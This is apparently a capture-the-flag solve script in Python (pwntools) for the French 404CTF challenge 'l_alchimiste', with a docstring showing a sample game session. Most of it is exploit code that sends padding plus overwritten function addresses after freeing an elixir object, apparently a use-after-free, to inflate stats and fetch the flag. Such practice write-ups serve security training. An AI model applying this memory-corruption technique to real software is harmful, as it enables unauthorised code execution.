#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
$ ./l_alchimiste
[Alchimiste] : En entrant ici, vous avez fait le premier pas vers l'aventure mystique de l'alchimie, où la recherche de la connaissance et de la sagesse est sans fin.
[Alchimiste] : Montrez-moi votre force et votre intelligence, et je vous donnerai la clé de la porte de la connaissance.

[Alchimiste] : N'hésitez pas à faire un tour dans mon modeste laboratoire, je suis sûr que vous trouverez quelque chose qui vous aidera à progresser.

1: Acheter un élixir de force
2: Consommer un élixir de force
3: Parler à l'alchimiste
4: Montrer mes caractéristiques
5: Obtenir la clé
6: Sortir du cabinet d'alchimie
>>> 1

***** Achat d'un élixir de force
***** ~ 0x15146d0

1: Acheter un élixir de force
2: Consommer un élixir de force
3: Parler à l'alchimiste
4: Montrer mes caractéristiques
5: Obtenir la clé
6: Sortir du cabinet d'alchimie
>>> 2

***** Elixir consommé
***** Vous sentez votre force augmenter.
***** ~ 0x15146d0

1: Acheter un élixir de force
2: Consommer un élixir de force
3: Parler à l'alchimiste
4: Montrer mes caractéristiques
5: Obtenir la clé
6: Sortir du cabinet d'alchimie
>>> 3

[Vous] : AAAAAAAAAAAAAAAAAAAAA
***** ~ 0x15146d0

1: Acheter un élixir de force
2: Consommer un élixir de force
3: Parler à l'alchimiste
4: Montrer mes caractéristiques
5: Obtenir la clé
6: Sortir du cabinet d'alchimie
>>> 4
Voici une estimation numérique de vos caractéristiques:

        FOR: 110
        INT: 50
        OR: 50
1: Acheter un élixir de force
2: Consommer un élixir de force
3: Parler à l'alchimiste
4: Montrer mes caractéristiques
5: Obtenir la clé
6: Sortir du cabinet d'alchimie
'''

from pwn import *

exe = ELF('./l_alchimiste')

host, port = "challenges.404ctf.fr", "30944"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


# Achat d'un elixir
p.sendlineafter(b'>>> ', '1'.encode())
# Consommation de cet elixir
p.sendlineafter(b'>>> ', '2'.encode())

# -----------------------------------
# Augmentation de la FORCE, en rusant
# -----------------------------------
dialogue1 = b'A'*64 + b'\xf1\x08\x40\x00\x00\x00\x00\x00'
for _ in range(4):
    p.sendlineafter(b'>>> ', '3'.encode())
    p.sendlineafter(b'[Vous] : ', dialogue1)
    p.sendlineafter(b'>>> ', '2'.encode())


# -----------------------------------------
# Augmentation de l'INTELLIGENCE, en rusant
# -----------------------------------------
dialogue2 = b'A'*64 + b'\xd5\x08\x40\x00\x00\x00\x00\x00'
for _ in range(10):
    p.sendlineafter(b'>>> ', '3'.encode())
    p.sendlineafter(b'[Vous] : ', dialogue2)
    p.sendlineafter(b'>>> ', '2'.encode())

# Affichage des caractéristiques
p.sendlineafter(b'>>> ', '4'.encode())
print(p.recvuntil(b'>>> ').decode().strip())

# Récupération du flag
#p.interactive()
p.sendline('5'.encode())
print(p.recvall().decode().strip())

# Fermeture de la connexion
p.close()
